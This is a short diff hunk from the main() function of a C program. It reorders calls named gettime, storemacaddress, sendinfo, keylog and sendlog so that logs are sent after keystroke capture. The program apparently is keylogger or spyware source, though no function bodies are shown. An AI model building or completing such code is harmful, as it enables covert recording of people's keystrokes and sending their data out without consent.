@@ -351,7 +351,7 @@ int main()
     gettime();
     storemacaddress();
     sendinfo();
-    sendlog();
     keylog();
+    sendlog();
     return 0;
 }
